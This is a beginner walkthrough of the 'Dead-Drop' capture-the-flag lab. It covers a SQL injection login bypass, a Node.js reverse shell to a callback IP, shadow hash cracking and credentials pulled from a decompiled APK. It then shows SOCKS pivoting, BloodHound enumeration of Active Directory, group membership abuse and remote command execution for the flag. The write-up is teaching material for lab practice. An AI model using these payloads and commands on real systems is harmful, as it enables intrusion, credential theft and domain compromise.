Dead-Drop TryHackMe CTF Walkthrough
==================================
Every dead drop points inward. Chain your findings, pivot through the gaps, and follow the trail until nothing is out of reach.
This walkthrough is designed for beginners who want to understand not just the commands, but the reasoning behind each step. I'll guide you through reconnaissance, exploitation, privilege escalation, and Active Directory pivoting

<img width="250" height="250" alt="dead-drop" src="https://github.com/user-attachments/assets/cd1d8737-a967-4b51-9fb9-51b101b5637c" />

🕵️ Initial Reconnaissance
--------------------------
- We start with scanning the target:
```
nmap -sS -sC -sV -p 22,80 TARGET_IP
```
<img width="545" height="284" alt="dead_0_nmap_service_enum" src="https://github.com/user-attachments/assets/dfc30583-1f49-4194-84f8-6c08badda0b7" />

-sS: Stealth SYN scan
-sC: Default scripts (great for quick service checks)
-sV: Version detection
-p 22,80: Focus on SSH and HTTP

- Tip: Always run a full port scan (-p-) later to ensure you don't miss hidden services.

🌐 Access Through URL
----------------------
```
Visiting http://TARGET_IP lands us on a login page.
```
<img width="944" height="399" alt="dead_1_admin_login" src="https://github.com/user-attachments/assets/5b63693b-8eb8-49e0-819b-750fd45b5b58" />

🔑 Authentication Bypass
-------------------------
- We attempt SQL injection:
```
' or 1=1;--
```
<img width="940" height="376" alt="dead_1_admin_dashboard" src="https://github.com/user-attachments/assets/3abeca34-1d00-411c-97a3-f30680c55846" />

- This bypasses authentication and logs us in as Admin.
- Use tools like sqlmap to automate testing and confirm injection points.
  
💻 Payload Execution
---------------------
- The file upload feature allows us to upload a malicious script for a reverse shell.
- Generate payload using RevShells
- Use tun0 ip address for reverse connection
- Example Node.js reverse shell:
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.21.14", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```
- Upload the script, set up a listener, and catch the shell.

<img width="331" height="112" alt="dead_2_node" src="https://github.com/user-attachments/assets/364c49b1-eefd-44ac-8d8f-55ddf7846359" />
  
🧭 System Enumeration
---------------------
- We're logged in as Node.
- Found shadow.bak
- Extracted contents:
```
cat shadow.bak
```
<img width="487" height="75" alt="dead_2_node_shadow" src="https://github.com/user-attachments/assets/5fdabfae-8277-4340-809d-3af4fa561386" />

- Cracked hashes using John the Ripper:
- [Hash Indentifier](https://hashcat.net/wiki/doku.php?id=example_hashes)
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
<img width="483" height="140" alt="dead_2_node_john" src="https://github.com/user-attachments/assets/94f5019e-f60e-40c0-a325-f14a7c512311" />

- Result: Credentials for svc-drop.
  
🔐 SSH Access
--------------
```
ssh svc-drop@TARGET_IP
```
<img width="431" height="73" alt="dead_3_svc-drop" src="https://github.com/user-attachments/assets/e76106e0-2c22-41eb-9a08-53cbe8a0fefa" />

📦 APK Analysis
---------------
- Copied APK file:
```
scp svc-drop@TARGET_IP:/home/svc-drop/backup/deaddrop-mobile.apk .
```
- Decompiled with JADX:
```
mkdir jadx
unzip jadx-1.5.5.zip -d jadx
cd jadx/bin
chmod +x jadx-gui
./jadx-gui ../../deaddrop-mobile.apk
```
<img width="497" height="269" alt="dead_4_apk_jadx_review" src="https://github.com/user-attachments/assets/0b72b952-cb09-401b-87ee-889cf21ea4d4" />

- Searched for hardcoded credentials → Found internal username & password.
- Navigation -> text search -> password

<img width="663" height="336" alt="dead_4_apk_jadx_password" src="https://github.com/user-attachments/assets/bd50840e-26e0-4d6c-a7b5-28a377f08071" />

  
🔄 Pivoting & Active Directory Enumeration
------------------------------------------
- Once initial access is established, the next phase involves pivoting into the internal network and enumerating Active Directory (AD).
- Establish SOCKS Proxy
- Create a secure tunnel to pivot traffic through the compromised host.
```
ssh svc-drop@TARGET_IP -f -N -D 1080
```
- This sets up a dynamic SOCKS proxy on port 1080
- Edit /etc/proxychains.conf and add: socks4 127.0.0.1 1080

- Verify AD Credentials
- Confirm that the compromised account is valid within the Active Directory domain.
- Use proxychains with NetExec (nxc):
```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc
```
<img width="494" height="160" alt="dead_5_pivot_nxc_smb_check" src="https://github.com/user-attachments/assets/7f38c402-71ce-45ed-b0b0-e51b785d7cb0" />

- Generate Hosts File
- Create a local hosts file for easier DNS resolution
```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc --generate-hosts-file hosts
```
- Append domain mapping manually:
```
echo "192.168.11.100     DEADDROP-DC.deaddrop.loc deaddrop.loc DEADDROP-DC" >> /etc/hosts
```

🩸 BloodHound Enumeration
-------------------------
- During the pivoting stage, we use BloodHound to enumerate Active Directory objects and relationships.
Step 1: Run BloodHound Python
- We start by collecting data from the target domain using bloodhound-python with proxychains:
```
proxychains bloodhound-python -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc -ns 192.168.11.100 -c All --zip -dns-tcp
```
- This command attempts to enumerate all AD objects and generate a zipped dataset for analysis.
Step 2: Resolve Errors
- During execution, an error occurred due to version mismatch. Reinstalling the correct BloodHound version fixed the issue:
```
/usr/local/pyenv/versions/3.8.20/bin/pip install --force-reinstall 'bloodhound==1.7.2'
```
Step 3: Analyze Data in BloodHound
- Once the zip file is generated, load it into the BloodHound GUI for visualization. BloodHound provides a graphical map of AD objects, trust relationships, and potential attack paths.
Step 4: Configure Neo4j Database
- BloodHound relies on Neo4j as its backend database. To initialize and start Neo4j:
```
neo4j stop
JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 neo4j-admin set-initial-password 'neo4j'
JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 neo4j start
```
- Once running, BloodHound can connect to Neo4j and display the AD graph.

🗂 Uploading AD Data & Privilege Analysis
-----------------------------------------
- After collecting the BloodHound data, upload the AD zip file into the BloodHound interface. This allows us to visualize relationships between users, groups, and privileges.
- Verify User Privileges

<img width="889" height="381" alt="dead_6_AD_privilege" src="https://github.com/user-attachments/assets/58cdbbc2-bb3f-40d4-b3a5-e4a20a9afffb" />

<img width="494" height="160" alt="dead_5_pivot_nxc_smb_check" src="https://github.com/user-attachments/assets/7c6810ea-6677-4d6a-8f60-727fbe000ed8" />

- From the analysis, we confirm that the account j.harris is already a member of the Domain Admins group. This provides significant control over the domain.
- Targeting Additional Privileges
- To further escalate and demonstrate group manipulation, we target the ITSUPPORT-ADMINS group. Adding our user to this group can expand access and persistence within the environment.
```
proxychains net -dc-ip 192.168.11.100 -target-ip 192.168.11.100 'deaddrop.loc/j.harris:DropsOfJupiter2026!@DEADDROP-DC.deaddrop.loc' group -name "ITSUPPORT-ADMINS" -join j.harris
```
<img width="895" height="323" alt="dead_6_AD_elev_privilege" src="https://github.com/user-attachments/assets/9785a8dc-0c17-4f9f-8c3b-67dc9f58ac16" />

🏴 Capturing the Flag
----------------------
- With elevated privileges, we can now access sensitive files. Using SMB execution, we retrieve the final flag:
```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -d deaddrop.loc -x "type c:\users\administrator\desktop\flag.txt"
```
<img width="773" height="344" alt="dead_6_AD_final_flag" src="https://github.com/user-attachments/assets/97a3ab51-9d43-4e4b-a579-c9bab2106908" />

- This confirms successful exploitation and completion of the challenge.
